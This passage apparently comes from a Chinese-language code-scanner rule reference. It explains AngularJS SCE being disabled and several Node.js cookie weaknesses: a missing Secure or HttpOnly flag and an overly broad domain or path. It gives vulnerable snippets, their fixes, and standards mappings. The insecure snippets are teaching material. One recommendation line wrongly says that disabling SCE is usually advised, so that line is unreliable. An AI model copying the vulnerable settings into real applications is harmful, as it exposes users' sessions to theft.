<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">myModule.config(function($sceProvider)&#123;</span><br><span class="line"></span><br><span class="line">  $sceProvider.enabled(false);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-51"><a href="#RECOMMENDATIONS-51" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>通常建议禁用此保护机制，此保护机制仅应用于调试。使用此保护机制会使框架中产生极少量的开销，安全确定是否应关闭此机制的唯一方式是，如果您确定站点 100% 安全，不会受漏洞攻击，即如果情况确实如此，则此应用程序将是一个非常简单的应用程序，没有任何用户输入。</p>
<h5 id="REFERENCES-50"><a href="#REFERENCES-50" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Strict Contextual Escaping Google</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 554 </p>
<p>[3] Standards Mapping - Common Weakness Enumeration Top 25 2019 [3] CWE ID 020 </p>
<p>[4] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002754 </p>
<p>[5] Standards Mapping - FIPS200 CM </p>
<p>[6] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[8] Standards Mapping - OWASP Application Security Verification Standard 4.0 5.1.3 Input Validation Requirements, 5.1.4 Input Validation Requirements, 14.1.3 Build </p>
<p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls </p>
<p>[10] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management </p>
<p>[11] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration </p>
<p>[12] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration </p>
<p>[13] Standards Mapping - OWASP Top 10 2017 A6 Security Misconfiguration </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.1 </p>
<p>[21] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002560 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002560 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002560 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002560 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002560 CAT I </p>
<p>[39] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20) </p>
<h4 id="Cookie-Security-Cookie-not-Sent-Over-SSL"><a href="#Cookie-Security-Cookie-not-Sent-Over-SSL" class="headerlink" title="Cookie Security: Cookie not Sent Over SSL"></a>Cookie Security: Cookie not Sent Over SSL</h4><h5 id="ABSTRACT-52"><a href="#ABSTRACT-52" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>创建了 cookie，但未将 secure 标记设置为 true。</p>
<h5 id="EXPLANATION-52"><a href="#EXPLANATION-52" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>现今的 Web 浏览器支持每个 cookie 的 secure 标记。如果设置了该标记，那么浏览器只会通过 HTTPS 发送 cookie。通过未加密的通道发送 cookie 将使其受到网络截取攻击，因此安全标记有助于保护 cookie 值的保密性。如果 cookie 包含私人数据或带有会话标识符，那么该标记尤其重要。</p>
<p>示例 1：在下面的示例中，在未将 secure 属性设置为 true 的情况下，为响应添加了一个 Cookie。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res.cookie(&apos;important_cookie&apos;, info, &#123;domain: &apos;secure.example.com&apos;, path: &apos;/admin&apos;, httpOnly: true, secure: false&#125;);</span><br></pre></td></tr></table></figure>
<p>如果应用程序同时使用 HTTPS 和 HTTP，但没有设置 secure 标记，那么在 HTTPS 请求过程中发送的 cookie 也会在随后的 HTTP 请求过程中被发送。通过未加密的无线连接截取网络信息流对攻击者而言十分简单，因此通过 HTTP 发送 cookie（特别是具有会话 ID 的 cookie）可能会危及应用程序安全。</p>
<h5 id="RECOMMENDATIONS-52"><a href="#RECOMMENDATIONS-52" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>对所有新 cookie 设置 Secure 标记，指示浏览器不要以明文形式发送这些 cookie。</p>
<p>示例 2：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res.cookie(&apos;important_cookie&apos;, info, &#123;domain: &apos;secure.example.com&apos;, path: &apos;/admin&apos;, httpOnly: true, secure: true&#125;);</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-51"><a href="#REFERENCES-51" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Mike Perry Automated HTTPS Cookie Hijacking </p>
<p>[2] Node.js Security Checklist </p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 614 </p>
<p>[4] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001184, CCI-002418, CCI-002420, CCI-002421, CCI-002422 </p>
<p>[5] Standards Mapping - FIPS200 CM, SC </p>
<p>[6] Standards Mapping - General Data Protection Regulation Insufficient Data Protection </p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1) </p>
<p>[8] Standards Mapping - OWASP Application Security Verification Standard 4.0 2.6.3 Look-up Secret Verifier Requirements, 3.2.3 Session Binding Requirements, 3.4.1 Cookie-based Session Management, 6.2.1 Algorithms, 8.1.6 General Data Protection </p>
<p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M4 Unintended Data Leakage </p>
<p>[10] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management </p>
<p>[11] Standards Mapping - OWASP Top 10 2007 A9 Insecure Communications </p>
<p>[12] Standards Mapping - OWASP Top 10 2010 A9 Insufficient Transport Layer Protection </p>
<p>[13] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[14] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.3 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.7, Requirement 6.5.9 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.4 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4, Requirement 6.5.10 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4, Requirement 6.5.10 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4, Requirement 6.5.10 </p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 4.1, Requirement 6.5.4, Requirement 6.5.10 </p>
<p>[22] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 6.2 - Sensitive Data Protection, Control Objective 7 - Use of Cryptography </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260.1 CAT II </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002220 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002220 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002220 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002220 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002220 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002220 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002220 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002220 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002220 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002220 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[40] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication </p>
<p>[41] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04) </p>
<h4 id="Cookie-Security-HTTPOnly-not-Set"><a href="#Cookie-Security-HTTPOnly-not-Set" class="headerlink" title="Cookie Security: HTTPOnly not Set"></a>Cookie Security: HTTPOnly not Set</h4><h5 id="ABSTRACT-53"><a href="#ABSTRACT-53" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>程序创建了 cookie，但未能将 HttpOnly 标记设置为 true。</p>
<h5 id="EXPLANATION-53"><a href="#EXPLANATION-53" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>所有主要浏览器均支持 HttpOnly Cookie 属性，可阻止客户端脚本访问 Cookie。Cross-Site Scripting 攻击通常会访问 Cookie，以试图窃取会话标识符或身份验证令牌。如果未启用 HttpOnly，攻击者就能更容易地访问用户 Cookie。</p>
<p>示例 1：以下代码会在未设置 httpOnly 属性的情况下创建一个 Cookie。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res.cookie(&apos;important_cookie&apos;, info, &#123;domain: &apos;secure.example.com&apos;, path: &apos;/admin&apos;&#125;);</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-53"><a href="#RECOMMENDATIONS-53" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>在创建 Cookie 时启用 HttpOnly 属性。</p>
<p>示例 2：以下代码创建的 Cookie 与Example 1 中的代码相同，但这次会将 httpOnly 属性设置为 true。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res.cookie(&apos;important_cookie&apos;, info, &#123;domain: &apos;secure.example.com&apos;, path: &apos;/admin&apos;, httpOnly: true&#125;);</span><br></pre></td></tr></table></figure>
<p>已开发出了多种绕过将 HttpOnly设置为 true 的机制，因此它并非完全有效。</p>
<h5 id="REFERENCES-52"><a href="#REFERENCES-52" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Amit Klein Round-up: Ways to bypass HttpOnly (and HTTP Basic auth) </p>
<p>[2] Node.js Security Checklist </p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 1004 </p>
<p>[4] Standards Mapping - Common Weakness Enumeration Top 25 2019 [15] CWE ID 732 </p>
<p>[5] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001184, CCI-002418, CCI-002420, CCI-002421, CCI-002422 </p>
<p>[6] Standards Mapping - FIPS200 CM </p>
<p>[7] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[8] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1), SC-23 Session Authenticity (P1) </p>
<p>[9] Standards Mapping - OWASP Application Security Verification Standard 4.0 3.2.3 Session Binding Requirements, 3.4.2 Cookie-based Session Management, 4.1.3 General Access Control Design, 4.2.1 Operation Level Access Control, 4.3.3 Other Access Control Considerations, 13.1.4 Generic Web Service Security Verification Requirements </p>
<p>[10] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M4 Unintended Data Leakage </p>
<p>[11] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management </p>
<p>[12] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration </p>
<p>[13] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[14] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.3 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.7 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.10 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.10 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.10 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.10 </p>
<p>[21] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002210 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002210 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002210 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002210 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002210 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002210 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002210 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002210 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002210 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002210 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[32] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication </p>
<p>[33] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Authentication (WASC-01) </p>
<h4 id="Cookie-Security-Overly-Broad-Domain"><a href="#Cookie-Security-Overly-Broad-Domain" class="headerlink" title="Cookie Security: Overly Broad Domain"></a>Cookie Security: Overly Broad Domain</h4><h5 id="ABSTRACT-54"><a href="#ABSTRACT-54" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>域范围过大的 Cookie 为攻击者利用其他应用程序攻击某个应用程序创造了条件。</p>
<h5 id="EXPLANATION-54"><a href="#EXPLANATION-54" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>开发人员通常将 Cookie 设置为在类似“.example.com”的基本域中处于活动状态。这会使 Cookie 暴露在基本域和任何子域中的所有 Web 应用程序下。由于 Cookie 通常包含敏感信息（如会话标识符），因此在应用程序之间共享 Cookie 可能会导致其中一个应用程序的漏洞危及其他应用程序安全。</p>
<p>示例 1：</p>
<p>假设您有一个安全应用程序并将其部署在 <a href="http://secure.example.com/" target="_blank" rel="noopener">http://secure.example.com/</a> 上，当用户登录时，该应用程序将使用域“.example.com”设置会话 ID cookie。</p>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cookie_options = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">cookie_options.domain = &apos;.example.com&apos;;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">res.cookie(&apos;important_cookie&apos;, info, cookie_options);</span><br></pre></td></tr></table></figure>
<p>假设您在 <a href="http://insecure.example.com/" target="_blank" rel="noopener">http://insecure.example.com/</a> 上有另一个不太安全的应用程序，它包含 cross-site scripting 漏洞。任何浏览到 <a href="http://insecure.example.com" target="_blank" rel="noopener">http://insecure.example.com</a> 的 <a href="http://secure.example.com" target="_blank" rel="noopener">http://secure.example.com</a> 认证用户面临着暴露来自 <a href="http://secure.example.com" target="_blank" rel="noopener">http://secure.example.com</a> 的会话 cookie 的风险。</p>
<p>除了读取 cookie 外，攻击者还可能使用 insecure.example.com 进行 cookie poisoning 攻击，创建自己范围过大的 cookie，并覆盖来自 secure.example.com 的 cookie。</p>
<h5 id="RECOMMENDATIONS-54"><a href="#RECOMMENDATIONS-54" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将 cookie 域设置为具有尽可能高的限制性。</p>
<p>示例 2：以下代码显示如何针对“说明”部分中的示例将 cookie 域设置为“secure.example.com”。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cookie_options = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">cookie_options.domain = &apos;secure.example.com&apos;;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">res.cookie(&apos;important_cookie&apos;, info, cookie_options);</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-53"><a href="#REFERENCES-53" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Node.js Security Checklist </p>
<p>[2] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001368, CCI-001414 </p>
<p>[3] Standards Mapping - FIPS200 CM </p>
<p>[4] Standards Mapping - General Data Protection Regulation Access Violation </p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1) </p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M4 Unintended Data Leakage </p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management </p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling </p>
<p>[9] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration </p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[11] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.3 </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.7 </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.10 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.10 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.10 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.10 </p>
<p>[18] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[29] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage </p>
<p>[30] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13) </p>
<h4 id="Cookie-Security-Overly-Broad-Path"><a href="#Cookie-Security-Overly-Broad-Path" class="headerlink" title="Cookie Security: Overly Broad Path"></a>Cookie Security: Overly Broad Path</h4><h5 id="ABSTRACT-55"><a href="#ABSTRACT-55" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>可通过相同域中的其他应用程序访问路径范围过大的 cookie。</p>
<h5 id="EXPLANATION-55"><a href="#EXPLANATION-55" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>开发人员通常将 Cookie 设置为可从根上下文路径“/”进行访问。这会使 Cookie 暴露在该域的所有 Web 应用程序下。由于 Cookie 通常包含敏感信息（如会话标识符），因此在应用程序之间共享 Cookie 可能会导致其中一个应用程序的漏洞危及其他应用程序安全。</p>
<p>示例 1：</p>
<p>假设您有一个论坛应用程序并将其部署在 <a href="http://communitypages.example.com/MyForum" target="_blank" rel="noopener">http://communitypages.example.com/MyForum</a> 上，当用户登录该论坛时，该应用程序将使用路径“/”设置会话 ID cookie。</p>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cookie_options = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">cookie_options.path = &apos;/&apos;;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">res.cookie(&apos;important_cookie&apos;, info, cookie_options);</span><br></pre></td></tr></table></figure>
<p>假设攻击者在<a href="http://communitypages.example.com/EvilSite上创建了另一个应用程序，并在论坛上发布了该站点的链接。当论坛用户点击该链接时，浏览器会将/MyForum设置的" target="_blank" rel="noopener">http://communitypages.example.com/EvilSite上创建了另一个应用程序，并在论坛上发布了该站点的链接。当论坛用户点击该链接时，浏览器会将/MyForum设置的</a> Cookie 发送到在/EvilSite上运行的应用程序。通过这种方式窃取会话 ID 后，攻击者就能够危及浏览到/EvilSite的任何论坛用户的帐户安全。</p>
<p>除了读取 cookie 外，攻击者还可能使用/EvilSite进行 cookie poisoning 攻击，创建自己范围过大的 cookie，并覆盖来自/MyForum的 cookie。</p>
<h5 id="RECOMMENDATIONS-55"><a href="#RECOMMENDATIONS-55" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>确保将 cookie 路径设置为具有尽可能高的限制性。</p>
<p>示例 2：以下代码显示如何针对“说明”部分中的示例将 cookie 路径设置为“/MyForum”。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cookie_options = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">cookie_options.path = &apos;/MyForum&apos;;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">res.cookie(&apos;important_cookie&apos;, info, cookie_options);</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-54"><a href="#REFERENCES-54" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Node.js Security Checklist </p>
<p>[2] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001368, CCI-001414 </p>
<p>[3] Standards Mapping - FIPS200 CM </p>
<p>[4] Standards Mapping - General Data Protection Regulation Access Violation </p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1) </p>
<p>[6] Standards Mapping - OWASP Application Security Verification Standard 4.0 3.4.5 Cookie-based Session Management </p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M4 Unintended Data Leakage </p>
